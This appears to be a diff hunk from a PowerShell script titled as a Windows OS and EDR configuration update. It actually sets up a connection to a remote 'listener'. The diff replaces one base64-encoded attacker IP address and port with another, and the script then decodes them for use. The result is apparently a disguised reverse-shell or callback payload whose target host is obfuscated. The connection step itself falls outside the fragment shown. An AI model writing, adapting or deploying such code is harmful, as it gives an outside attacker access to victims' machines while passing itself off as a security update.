@@ -50,8 +50,8 @@ Updating the Windows OS and EDR Configuration
 }
 Show-Banner
 # Replace the IP and port with your own listener's IP and port (base64 encoded)
-$encodedIp = 'NTQuMjIxLjI4Ljc5' # replace with Listner IP
-$encodedPort = 'MTQzMw==' # Replace with base64 encoded port
+$encodedIp = 'My44MC40Ni42Ng==' # replace with Listner IP
+$encodedPort = 'NDQz' # Replace with base64 encoded port
 # Decode the IP address
 $ip = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedIp))
 $port = [System.Convert]::ToInt32([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedPort)))
